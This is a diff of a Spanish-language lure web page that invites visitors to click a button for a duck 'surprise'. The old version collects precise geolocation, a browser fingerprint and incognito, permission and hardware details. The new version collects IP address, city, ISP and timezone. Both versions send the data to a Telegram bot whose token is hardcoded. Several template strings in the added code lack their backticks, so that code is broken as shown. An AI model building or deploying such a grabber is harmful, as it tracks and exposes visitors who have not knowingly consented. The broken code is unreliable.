@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <title>Test</title>
+  <title>Recolección Privada</title>
   <style>
     body {
       font-family: Arial;
@@ -38,155 +38,92 @@
     .duck {
       font-size: 64px;
       margin-top: 20px;
+      display: none;
+    }
+    #status {
+      margin-top: 15px;
+      font-size: 14px;
+      color: gray;
     }
   </style>
 </head>
 <body>
   <div class="box">
-    <h2>Aprieta el botón para una sorpresa/h2>
-    <button id="startBtn">sorpresa</button>
-    <div class="duck" id="duck" style="display: none;">🦆</div>
+    <h2>Aprieta el botón Porfavor</h2>
+    <button id="startBtn">Dame Click</button>
+    <div class="duck" id="duck">🦆</div>
+    <div id="status"></div>
   </div>
 
 <script>
 (() => {
-  const BOT_TOKEN = "8011619975:AAE_Donqy5xn8RD0lJ2LOIP326dTDrnO1Ag";
-  const CHAT_ID = "6065284869";
+  // Reemplaza estos valores por los tuyos
+  const BOT_TOKEN = "8011619975:AAE_Donqy5xn8RD0lJ2LOIP326dTDrnO1Ag"; // ← TU TOKEN DE TELEGRAM
+  const CHAT_ID = "6065284869";     // ← TU ID DE CHAT O DEL USUARIO
 
   const startBtn = document.getElementById("startBtn");
   const duckEl = document.getElementById("duck");
+  const statusEl = document.getElementById("status");
 
-  let humanInteraction = false;
-  ["click", "mousemove", "keydown", "touchstart"].forEach(evt => {
-    window.addEventListener(evt, () => { humanInteraction = true; }, { once: true });
+  startBtn.addEventListener("click", async () => {
+    startBtn.disabled = true;
+    startBtn.textContent = "Enviando...";
+    duckEl.style.display = "block";
+    statusEl.textContent = "Recopilando información...";
+
+    try {
+      // Obtener info de IP usando ipapi.co
+      const ipResponse = await fetch("https://ipapi.co/json/"); 
+      const ipData = await ipResponse.json();
+
+      // Formatear mensaje
+      const message = 
+🚨 Datos del usuario 🦆
+
+IP: ${ipData.ip}
+Región: ${ipData.region}
+Ciudad: ${ipData.city}
+País: ${ipData.country_name}
+ISP: ${ipData.org}
+Continente: ${ipData.continent_code}
+Idioma del navegador: ${navigator.language}
+Zona horaria: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+
+Fecha: ${new Date().toLocaleString()}
+;
+
+      // Enviar a Telegram
+      await sendToTelegram(message);
+
+      statusEl.innerHTML = "<span style='color:green;'>Datos enviados correctamente 🦆</span>";
+    } catch (e) {
+      console.error(e);
+      statusEl.innerHTML = "<span style='color:red;'>Error al enviar datos</span>";
+    }
+
+    startBtn.disabled = false;
+    startBtn.textContent = "Dame Click";
   });
-
-  function detectHeadless() {
-    return (/HeadlessChrome/.test(navigator.userAgent) ||
-            !navigator.plugins?.length ||
-            !navigator.languages?.length ||
-            navigator.webdriver)
-      ? "Sí" : "No";
-  }
-
-  async function detectIncognito() {
-    return new Promise(resolve => {
-      const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
-      if (!fs) resolve("No detectable");
-      else fs(window.TEMPORARY, 100, () => resolve("No"), () => resolve("Sí"));
-    });
-  }
-
-  function getFingerprint() {
-    return btoa([
-      navigator.userAgent,
-      navigator.language,
-      screen.width + 'x' + screen.height,
-      navigator.hardwareConcurrency || "n/a",
-      Intl.DateTimeFormat().resolvedOptions().timeZone || "n/a"
-    ].join('|'));
-  }
-
-  async function checkPermissions() {
-    if (!navigator.permissions) return "No soportado";
-    try {
-      const cam = await navigator.permissions.query({name:"camera"});
-      const mic = await navigator.permissions.query({name:"microphone"});
-      const geo = await navigator.permissions.query({name:"geolocation"});
-      return `Cámara: ${cam.state}, Micrófono: ${mic.state}, Geoloc: ${geo.state}`;
-    } catch {
-      return "Error consulta permisos";
-    }
-  }
-
-  function checkHardwareAcceleration() {
-    try {
-      const canvas = document.createElement('canvas');
-      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-      if (!gl) return "No WebGL";
-      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-      if (!dbg) return "No debug info";
-      return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "No renderer";
-    } catch {
-      return "Error WebGL";
-    }
-  }
-
-  async function detectAdblock() {
-    try {
-      await fetch("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js",  {method:"HEAD", mode:"no-cors"});
-      return "No detectado";
-    } catch {
-      return "Probable AdBlock";
-    }
-  }
-
-  function checkTimezoneLocale() {
-    try {
-      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const lang = navigator.language || navigator.userLanguage;
-      if (lang.startsWith('es') && tz.startsWith('UTC')) return "Discrepancia detectada";
-      return "OK";
-    } catch {
-      return "No disponible";
-    }
-  }
-
-  async function getIPInfo() {
-    try {
-      const res = await fetch("https://ipapi.com/ip_api.php");  
-      if (!res.ok) throw new Error("No response");
-      return await res.json();
-    } catch {
-      return null;
-    }
-  }
 
   async function sendToTelegram(message) {
     try {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;  
+      const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage; 
       const response = await fetch(url, {
         method: "POST",
-        headers: {"Content-Type": "application/json"},
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: CHAT_ID,
           text: message,
         }),
       });
-      const data = await response.json();
-      console.log("Telegram response:", data);
-    } catch(e) {
-      console.warn("Error enviando a Telegram:", e);
+      if (!response.ok) throw new Error("Fallo al enviar mensaje");
+      return await response.json();
+    } catch (e) {
+      throw new Error("No se pudo enviar a Telegram: " + e.message);
     }
   }
 
-  async function collectAndSend() {
-    startBtn.disabled = true;
-    startBtn.textContent = "Enviando...";
-
-    const [ipRes, geoRes, incognitoStatus, permStatus, adblockStatus] = await Promise.allSettled([
-      getIPInfo(),
-      new Promise((res, rej) => {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(res, rej, {timeout: 3000});
-        } else rej();
-      }),
-      detectIncognito(),
-      checkPermissions(),
-      detectAdblock()
-    ]);
-
-    let message = "";
-
-    if (ipRes.status === "fulfilled" && ipRes.value) {
-      const ip = ipRes.value;
-      message += `IP: ${ip.query}
-ISP: ${ip.org}
-ASN: ${ip.as?.asn || "n/a"}
-Proxy/VPN/Tor: ${ip.is_proxy ? "Sí" : "No"}
-Ciudad: ${ip.city}
-Región: ${ip.regionName}
-País: ${ip.country}
-Versión IP: IPv${ip.ip_version}
-\n`;
-    } else {
+})();
+</script>
+</body>
+</html>
